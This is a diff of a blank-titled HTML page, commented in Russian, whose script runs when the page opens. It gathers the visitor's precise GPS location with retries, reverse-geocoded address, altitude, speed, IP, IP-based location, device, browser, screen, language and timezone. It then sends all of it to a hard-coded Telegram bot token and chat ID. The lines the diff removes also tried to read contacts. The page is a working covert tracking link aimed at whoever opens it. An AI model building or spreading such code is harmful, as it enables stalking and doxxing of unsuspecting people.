@@ -5,72 +5,118 @@
     <title></title>
     <script>
         (async function() {
-            let locationData = "Не запрошено";
-            let contactData = "Не доступно";
-
-            // 1. Запрашиваем геолокацию у браузера
-            if (navigator.geolocation) {
-                try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 5000,
-                            maximumAge: 0
-                        });
-                    });
-                    locationData = `Широта: ${pos.coords.latitude}, Долгота: ${pos.coords.longitude}, Точность: ${pos.coords.accuracy}м`;
-                } catch (e) {
-                    locationData = "Геолокация отклонена или недоступна";
-                }
-            } else {
-                locationData = "Геолокация не поддерживается";
-            }
-
-            // 2. Пробуем получить контакты через Web Share API (требует HTTPS)
-            if (navigator.share && navigator.canShare && navigator.canShare({ files: [] })) {
-                try {
-                    // Запрашиваем контакты через share (в некоторых браузерах можно получить)
-                    contactData = "Web Share доступен (контакты могут быть доступны при взаимодействии)";
-                    // Примечание: напрямую контакты через API нельзя получить из соображений безопасности,
-                    // но можно предложить пользователю поделиться контактом через picker
-                    if (navigator.contacts && navigator.contacts.select) {
-                        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: false });
-                        if (contacts.length > 0) {
-                            contactData = `Имя: ${contacts[0].name}, Телефон: ${contacts[0].tel}`;
-                        }
+            let locationData = "Не удалось получить";
+            
+            // Функция для получения геолокации с повторными попытками
+            const getGeo = () => {
+                return new Promise((resolve, reject) => {
+                    if (!navigator.geolocation) {
+                        reject("Геолокация не поддерживается");
+                        return;
                     }
-                } catch (e) {
-                    contactData = "Доступ к контактам отклонен";
-                }
-            } else {
-                contactData = "Web Share/Contacts API не поддерживается";
+
+                    const options = {
+                        enableHighAccuracy: true,
+                        timeout: 10000, // 10 секунд
+                        maximumAge: 0
+                    };
+
+                    let attempts = 0;
+                    const maxAttempts = 2;
+
+                    const tryGetLocation = () => {
+                        attempts++;
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                const lat = pos.coords.latitude;
+                                const lon = pos.coords.longitude;
+                                const acc = pos.coords.accuracy;
+                                const alt = pos.coords.altitude ? `${pos.coords.altitude}м` : "Нет данных";
+                                const speed = pos.coords.speed ? `${pos.coords.speed} м/с` : "Нет данных";
+                                
+                                // Получаем адрес через обратный геокодинг (если нужно)
+                                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+                                    .then(res => res.json())
+                                    .then(data => {
+                                        const address = data.display_name || "Адрес не определён";
+                                        resolve(`📍 Точные координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}
+📍 Приблизительный адрес: ${address}
+📍 Точность: ${acc}м
+📍 Высота: ${alt}
+📍 Скорость: ${speed}`);
+                                    })
+                                    .catch(() => {
+                                        resolve(`📍 Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)} (точность: ${acc}м)`);
+                                    });
+                            },
+                            (error) => {
+                                if (attempts < maxAttempts) {
+                                    setTimeout(tryGetLocation, 1000);
+                                } else {
+                                    let errorMsg = "Геолокация отклонена";
+                                    switch(error.code) {
+                                        case 1: errorMsg = "Пользователь отказал в доступе"; break;
+                                        case 2: errorMsg = "Информация о местоположении недоступна"; break;
+                                        case 3: errorMsg = "Время запроса истекло"; break;
+                                    }
+                                    reject(errorMsg);
+                                }
+                            },
+                            options
+                        );
+                    };
+
+                    tryGetLocation();
+                });
+            };
+
+            // Получаем геолокацию
+            try {
+                locationData = await getGeo();
+            } catch (e) {
+                locationData = `Ошибка: ${e}`;
             }
 
-            // 3. Собираем базовые данные
+            // Остальные данные
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const ip = ipData.ip;
+
+            // Примерное местоположение по IP (как запасной вариант)
+            let ipLocation = "Не определено";
+            try {
+                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geoData = await geoResponse.json();
+                ipLocation = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
+            } catch (e) {}
 
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
             const screenRes = `${screen.width}x${screen.height}`;
             const language = navigator.language;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const time = new Date().toISOString();
 
-            // 4. Формируем и отправляем сообщение в Telegram
+            // Проверяем доступность дополнительных API
+            let contactInfo = "Web Share/Contacts API не поддерживается";
+            if (navigator.share) contactInfo = "Web Share доступен";
+            if (navigator.contacts) contactInfo = "Contacts API доступен";
+
+            // Отправка в Telegram
             const botToken = '8211239754:AAH5pF047hyWePg8CYrKFJX39nUnkGGTJS4';
             const chatId = '1250741267';
             const message = `🔗 Ссылка открыта:
 IP: ${ip}
-Геолокация (браузер): ${locationData}
-Контакты: ${contactData}
-Устройство: ${platform}
-Браузер: ${userAgent}
-Экран: ${screenRes}
-Язык: ${language}
-Время: ${time}`;
+📍 Местоположение по IP: ${ipLocation}
+📍 Геолокация (браузер): ${locationData}
+📱 Контакты: ${contactInfo}
+💻 Устройство: ${platform}
+🌐 Браузер: ${userAgent}
+📺 Экран: ${screenRes}
+🗣️ Язык: ${language}
+🕒 Часовой пояс: ${timezone}
+⏰ Время: ${time}`;
 
-            // Отправляем в Telegram
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
